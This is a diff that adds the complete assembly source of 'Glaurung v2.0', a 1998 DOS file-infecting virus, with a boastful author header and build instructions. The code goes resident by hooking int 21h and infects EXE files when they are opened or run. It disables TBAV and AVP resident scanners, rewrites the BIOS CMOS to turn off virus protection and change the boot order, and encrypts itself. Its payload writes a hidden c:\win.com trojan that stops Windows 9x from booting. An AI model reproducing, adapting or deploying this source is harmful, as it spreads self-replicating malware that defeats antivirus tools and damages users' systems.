@@ -1,0 +1,451 @@
+
+title                            GLAURUNG v2.0
+
+comment # -ìëì-ù-ìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëì-ù-
+
+                   Computerz are made to run programz.
+                      Virii are computer programz.
+                    Computerz are made to run virii.
+
+
+  Glaurung, if ya don't know, iz the father of all dragon in Silmarillion.
+
+
+ Skillz / Improvements :
+  - changed way of residency (win compatible now) : bellow TOM, chain MCBs
+  - infect all dos exe-like on open and exec
+  - some bug fixing (now fully working)
+  - alter cmos on award/amibios/amiwinbios : remove virii protections and
+    make boot from C then A (stupid user can't boot from a clean d7)
+  - special infection (spice girlz virus way) : kill all heuristics!
+  - encrypted usin 16 bytes key from timer, few bytes fix (and commons)
+  - payload : paralyze a w9x system by creatin a c:\win.com
+  - retro : freeze all dos tbav TSRs and avptsr  (few bytes needed...)
+  - nothing destruciv ... i hope :)
+  - undetectable by all AV that i know 12/98 (mem + file)
+
+  Some idea came to me while readin' AVPVE, but i've wrote the whole code.
+  Compile with tasm (/m3) and tlink (/t). enjoy !
+
+
+
+                                         Ä÷ğ( mandragore )ğ÷Ä
+
+
+ÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìëìÄùÄìë #
+
+
+.model tiny
+.code
+.386
+bptr    equ <byte ptr>
+wptr    equ <word ptr>
+dptr    equ <dword ptr>
+display 'Glaurung 2 by mandragore!'
+virsiz  equ eof-vir
+
+        org 52h                 ;  infection mark
+
+Start:
+        jmp $+2+stcksz
+vir:
+        db 40 dup(?)
+fstack  dd 0                    ;  futur stack seg:off to the virii code
+stcksz  equ $-vir                                 ; must be relocated!
+
+        xor si,si
+decrypt:
+        xor wptr cs:[si+boc],1234h
+        org $-4
+adrboc  dw boc
+dkey    dw 0
+        inc si
+        cmp si,virsiz-dcrptsz
+        jne decrypt
+dcrptsz equ $-vir
+
+boc:    push ax bx cx dx
+        push ds
+
+        call delta
+delta:  pop bp                  ;  lame but crypted,
+        sub bp,offset delta     ;   and heuristics are already killed
+
+        mov ah,30h
+        mov bx,'ki'
+        int 21h                 ;  install check
+        cmp bx,'ll'
+        jz back_host
+
+        push cs
+        pop ds
+        push es
+        mov ax,3d00h
+        lea dx,bp+tbdrv
+        int 21h                 ;  any tbav product rsdnt?
+        jc chkavp
+        mov ax,1605h
+        mov dx,1
+        xor cx,cx
+        int 2fh
+        mov bptr es:[291h],0    ;  freeze tbdriver (disable all tbav module)
+        pop es
+        push es
+
+chkavp: pop ds
+        mov si,3f5ch
+        cmp wptr ds:[0ah],si     ;  avptsr resdnt?
+        jne noavptsr
+        mov ds,ds:[0ch]
+        and wptr ds:[23adh],0feh ;  disable 'access to file'
+        mov bptr ds:[si],0cfh    ;  freeze 'memory check'
+noavptsr:
+
+;------------------------  alloc and copy to ram
+
+        mov ax,es
+        dec ax
+        mov ds,ax
+        mov si,12h
+        mov ax,[si]
+        sub ax,(virsiz+cryptsz)/16+2            ;  decrease TOM
+        mov [si],ax
+        sub wptr ds:[3],(virsiz+cryptsz)/16+2   ;  and free RAM
+        xor si,si
+        mov dl,'M'
+        xchg [si],dl                   ;  we're no more the last in the chain
+        mov ds,ax
+        mov [si],dl                    ;  chain MCB
+        inc si
+        mov wptr [si],8
+        mov wptr [si+2],(virsiz+cryptsz)/16+1
+
+        inc ax
+        mov es,ax
+        push cs
+        pop ds
+        xor di,di
+        lea si,bp+vir
+        mov cx,virsiz
+        rep movsb                       ;  go in ram
+
+        mov ds,cx
+        shl eax,16
+        mov ax,hooker-vir
+        xchg eax,ds:[84h]               ;  chain int 21h
+        mov es:[org21-vir],eax
+        mov es:[int21-vir],eax
+
+;----------------------------  runtime eventz
+
+;--------  alter CMOS on award/amibios/amiwinbios
+
+        mov al,2eh
+        out 70h,al
+        in al,71h
+        mov ch,al
+        mov al,2fh
+        out 70h,al
+        in al,71h
+        mov cl,al               ;  cx = cmos checksum
+
+        mov ah,0c0h
+        int 15h                 ;  get BIOS table
+        mov ah,0
+        cmp wptr es:[bx+10],'wA';  award
+        je award
+        cmp wptr es:[bx+13],'LT';  phoenix
+        je noalter
+        cmp wptr es:[bx+10],'uQ';  quadram
+        je noalter
+
+axbios: test bptr es:[bx+8],00010000b
+        jz $+6
+        mov dl,10111001b        ;  amiwinbios
+        jmp $+4
+        mov dl,11011111b        ;  amibios
+        mov al,2dh
+        out 70h,al
+        in al,71h
+        sub cx,ax
+        and al,dl
+        jmp rchksm
+award:  mov al,3ch
+        out 70h,al
+        in al,71h
+        sub cx,ax
+        or al,10000001b
+
+rchksm: add cx,ax
+        out 71h,al      ;  update CMOS
+        mov al,2eh
+        out 70h,al
+        mov al,ch
+        out 71h,al      ;  restore check sum
+        mov al,2fh
+        out 70h,al
+        mov al,cl
+        out 71h,al      ;    "    "       "
+noalter:
+
+;-----------  install \win.com trojan?
+
+payload:
+        mov ah,4
+        int 1ah
+        cmp dl,31h
+        jne no_pay
+        push cs
+        pop ds
+        mov ah,3ch
+        mov cx,3
+        lea dx,bp+wintroj
+        int 21h
+        jc back_host            ;  create a +hr file \win.com
+        xchg ax,bx              ;  make the comp. asleep :)
+        mov ah,40h
+        lea dx,trojdts
+        mov cx,tdtssz
+        int 21h
+        mov ah,3eh
+        int 21h
+no_pay:
+
+;-----------------  try to infect command.com (MZ onez)
+
+        push cs
+        pop ds
+        lea dx,bp+cmdw9x
+        mov ah,4bh
+        int 21h                 ;)~  won't work but will infect
+
+;--------------------------------  leave
+
+back_host:
+        pop ds
+        push ds
+        pop es
+
+        mov ax,ds
+        add ax,10h
+        add cs:[bp+old_cs],ax           ;  restore CS
+        add cs:[bp+old_ss],ax           ;          SS
+        pop dx cx bx ax
+        jmp $+2                         ;  refresh the prefetch queue
+        cli
+        push 1234h
+        org $-2
+old_ss  dw 0
+        pop ss                          ;  restore stack
+        mov sp,0
+        org $-2
+old_sp  dw 0
+        sti
+        db 0eah                         ;  jmp to real beg
+old_ip  dw 0
+old_cs  dw -10h
+
+;=================================  datas
+
+wintroj db 'c:\win.com',0
+trojdts db 0EBh,13h,9Ch,80h,0FCh,0AEh,74h,6,9Dh,0EAh,0,0,0,0,0B0h,0FFh
+        db 0C6h,4,0,9Dh,0CFh,0BAh,36h,1,0B4h,09h,0CDh,21h,0B8h,2Fh,35h,0CDh
+        db 21h,89h,1Eh,0Ah,1,8Ch,6,0Ch,01h,0BAh,02h,1,0B8h,2Fh,25h,0CDh
+        db 21h,0BAh,15h,01h,0CDh,27h,49h,20h,63h,61h,6Eh,27h,74h,20h,62h,65h
+        db 61h,72h,20h,77h,69h,6Eh,64h,6Fh,77h,73h,2Eh,20h,73h,6Fh,72h,72h
+        db 79h,2Eh,13,10,49h,20h,68h,61h,74h,65h,20h,6Dh,79h,73h,65h,6Ch,66h
+        db 20h,61h,6Eh,64h,20h,49h,20h,77h,61h,6Eh,74h,20h,74h,6Fh,20h,64h
+        db 69h,65h,21h,0Dh,0Ah,24h
+tdtssz  equ $-trojdts
+cmdw9x  db 'c:\command.com',0
+tbdrv   db 'TBDRVXXX',0
+header  db 28 dup(?)
+ofreloc dd 0
+sig     db '[Glaurung v2.0]',0,'mandragore!',0
+crap    db 'Ash nazg durbatul–k,',13,10
+        db 'ash nazg gimbatul,',13,10
+        db 'ash nazg thrakatul–k,',13,10
+        db 'agh bruzum-ishi krimpatul.'
+
+crypt:  mov si,boc-vir
+loopc:  xor wptr [si],1234h
+        org $-2
+ckey    dw ?
+        inc si
+        cmp si,virsiz-1
+        jne loopc
+here    equ $-crypt
+        mov ah,40h
+        cwd
+        mov cx,virsiz
+        pushf
+        db 9ah
+int21   dd ?
+        mov bptr ds:[eof-vir+here],0c3h
+        jmp crypt
+cryptsz equ $-crypt
+
+;=================================  hooker
+
+hooker:
+        pushf
+        push ax
+        xor ah,4bh
+        pop ax
+        jz infect
+        cmp ah,3dh
+        je infect
+        cmp ah,30h
+        jne ret21
+        cmp bx,'ki'
+        jne ret21
+        mov bx,'ll'
+        popf
+        iret
+ret21:  popf
+        db 0eah
+org21   dd 0
+
+;----------------------------  infection part
+
+infect:
+        pusha
+        push ds es
+
+        mov ax,3d02h
+        pushf                   ;  don't loop
+        call dptr cs:[org21-vir]
+        jc endinf
+        push cs
+        pop ds
+        xchg ax,bx
+
+        mov ah,3fh
+        mov cx,28
+        mov dx,header-vir       ;  read header
+        mov si,dx
+        int 21h
+
+        mov cx,'ZM'
+        cmp wptr [si],cx        ;  good exe sig?
+        je dos_xe
+        xchg ch,cl
+        cmp wptr [si],cx        ;  reversed?
+        jne no_inf
+dos_xe: cmp bptr [si+18h],40h   ;  win exe?
+        je no_inf
+        cmp wptr [si+1ah],0     ;  overlays?
+        jne no_inf
+        cmp wptr [si+14h],52h   ;  infection mark?
+        je no_inf
+
+        mov eax,0fff00052h              ;  set cs:ip to PSP:52h (retf)
+        xchg eax,[si+14h]
+        mov ds:[old_ip-vir],eax         ;  and keep old values
+
+        mov ax,4202h
+        xor cx,cx
+        cwd                             ;  get file size
+        int 21h
+
+        push ax dx
+
+        shl dx,12
+        add ax,stcksz
+        mov cx,ax                       ;  calc the new entry point
+        shr cx,4
+        add dx,cx
+        and ax,0fh
+        sub dx,[si+8]
+        sub dx,3
+        add ax,48                 ;  re-adress to fit into the same seg
+        push bx
+
+;-----------  reloc job
+
+        mov ds:[ofreloc-vir+2],dx       ;  dx: seg of reloc item
+        mov wptr ds:[fstack-vir+2],dx   ;  put real entry point
+        mov wptr ds:[fstack-vir],ax     ;               in our futur stack
+        mov cx,ax
+        add cx,boc-decrypt+2
+        mov ds:[adrboc-vir],cx
+        xchg [si+0eh],dx                ;  update SS
+        mov ds:[old_ss-vir],dx          ;       keep old value
+        dec ax
+        dec ax
+        mov ds:[ofreloc-vir],ax         ;  ax: off of reloc item
+        dec ax
+        dec ax
+        xchg [si+10h],ax                ;     and SP
+        mov ds:[old_sp-vir],ax          ;       keep old value
+        mov cx,[si+6]
+        inc cx                          ;  inc nb of reloc item
+        mov [si+6],cx
+        mov dx,[si+18h]
+        dec cx
+        shl cx,2
+        add dx,cx                       ;  make dx points to the reloc table
+        mov bx,[si+8]
+        shl bx,4                        ;  header size > bx
+        or dx,dx                        ;  inconsistant header?
+        jz norelc
+        cmp dx,bx                       ;  enough place in reloc table?
+        pop bx
+        jb okrelc
+norelc: pop ax ax
+        jmp no_inf
+okrelc: mov ax,4200h
+        xor cx,cx
+        int 21h                         ;  lseek into reloc tabl
+        mov ah,40h
+        mov cx,4
+        mov dx,ofreloc-vir
+        int 21h                         ;  write the reloc item
+
+;-----------  header job, infection
+
+        pop dx ax                       ;  **
+        add ax,virsiz                   ;  calc new size in dx:ax
+        adc dx,0
+        mov cx,200h                     ;  adapt for header
+        div cx
+        inc ax
+        mov [si+2],dx                   ;  update header
+        mov [si+4],ax                   ;       "
+
+        mov ax,4202h
+        cwd
+        xor cx,cx       ;  lseek to eof
+        int 21h
+
+        in ax,40h       ;  get crypt key
+        mov ds:[ckey-vir],ax
+        mov ds:[dkey-vir],ax
+
+        push ds
+        pop es
+        mov si,crypt-vir
+        mov di,eof-vir
+        mov cx,cryptsz
+        rep movsb
+        call eof        ;  crypt/write/dcrypt/ret
+
+        mov ax,4200h
+        cwd
+        xor cx,cx       ;  lseek to bof
+        int 21h
+
+        mov ah,40h
+        mov dx,header-vir
+        mov cx,24       ;  write header
+        int 21h
+
+no_inf: mov ah,3eh
+        int 21h
+endinf: pop es ds
+        popa
+        jmp ret21
+        nop             ;  the luck byte
+eof:
+
+end start
